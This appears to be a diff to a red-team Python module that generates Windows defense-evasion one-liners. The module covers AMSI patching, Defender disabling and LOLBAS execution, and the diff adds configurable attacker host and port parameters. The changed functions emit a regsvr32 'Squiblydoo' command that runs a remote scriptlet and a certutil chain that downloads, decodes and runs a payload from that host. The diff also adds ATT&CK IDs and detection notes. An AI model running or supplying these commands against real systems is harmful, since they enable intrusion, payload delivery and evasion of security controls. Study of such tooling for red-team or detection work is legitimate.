@@ -4,7 +4,7 @@ Returns PowerShell and cmd.exe one-liners for AMSI patching, ETW silencing,
 Constrained Language Mode bypass, Defender disabling, and LOLBAS execution.
 For use in authorized red team exercises only.
 """
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 
 from .obfuscate import ps_tick_marks
 
@@ -29,6 +29,9 @@ class EvasionResult:
     command: str
     technique: str
     notes: str
+    techniques: list[str] = field(default_factory=list)
+    risk: str = "HIGH"
+    detections: list[str] = field(default_factory=list)
 
 
 # ── Techniques ────────────────────────────────────────────────────────────────
@@ -249,25 +252,32 @@ def _lolbas_mshta(payload: str, obfuscate: bool) -> EvasionResult:
     )
 
 
-def _lolbas_regsvr32(payload: str, obfuscate: bool) -> EvasionResult:
-    cmd = "regsvr32.exe /s /n /u /i:https://ATTACKER/payload.sct scrobj.dll"
+def _lolbas_regsvr32(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
+    cmd = f"regsvr32.exe /s /n /u /i:http://{lhost}:{lport}/payload.sct scrobj.dll"
     return EvasionResult(
         command=cmd,
         technique="lolbas_regsvr32",
         notes=(
             "Squiblydoo — executes remote SCT (scriptlet) via regsvr32. "
             "No admin, no disk artifacts for the SCT. "
-            "Requires staging an XML .sct file at ATTACKER. "
+            f"Stage an XML .sct file at http://{lhost}:{lport}/payload.sct. "
             "Detection: regsvr32 network connections."
         ),
+        techniques=["T1218.010"],
+        risk="HIGH",
+        detections=[
+            "regsvr32.exe initiating outbound HTTP traffic",
+            "regsvr32.exe with /i: argument pointing at remote URL",
+            "Defender ASR rule 'Block execution of potentially obfuscated scripts'",
+        ],
     )
 
 
-def _lolbas_certutil(payload: str, obfuscate: bool) -> EvasionResult:
+def _lolbas_certutil(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
     b64_file = "%TEMP%\\payload.b64"
     out_file = "%TEMP%\\payload.exe"
     cmd = (
-        f"certutil -urlcache -split -f https://ATTACKER/payload.b64 {b64_file} && "
+        f"certutil -urlcache -split -f http://{lhost}:{lport}/payload.b64 {b64_file} && "
         f"certutil -decode {b64_file} {out_file} && "
         f"del /f /q {b64_file} && "
         f"{out_file}"
@@ -277,10 +287,17 @@ def _lolbas_certutil(payload: str, obfuscate: bool) -> EvasionResult:
         technique="lolbas_certutil",
         notes=(
             "certutil -decode reverses base64 to binary. "
-            "Stage a base64-encoded PE at ATTACKER. "
+            f"Stage a base64-encoded PE at http://{lhost}:{lport}/payload.b64. "
             "Detection: certutil network connections, IDS on certutil user-agent. "
             "Cleanup: del /f /q %TEMP%\\payload.exe after execution."
         ),
+        techniques=["T1140", "T1105"],
+        risk="HIGH",
+        detections=[
+            "certutil.exe -urlcache -f to non-Microsoft host",
+            "certutil.exe -decode followed by execution of decoded binary",
+            "Microsoft-Windows-CAPI2 log entries for unusual cert ops",
+        ],
     )
 
 
@@ -320,7 +337,12 @@ def generate_evasion(
     technique: str,
     payload: str = "powershell.exe",
     obfuscate: bool = True,
+    lhost: str = "192.168.1.100",
+    lport: int = 8080,
 ) -> EvasionResult:
     if technique not in _DISPATCH:
         raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
-    return _DISPATCH[technique](payload, obfuscate)
+    fn = _DISPATCH[technique]
+    if technique in {"lolbas_regsvr32", "lolbas_certutil"}:
+        return fn(payload, obfuscate, lhost, lport)
+    return fn(payload, obfuscate)
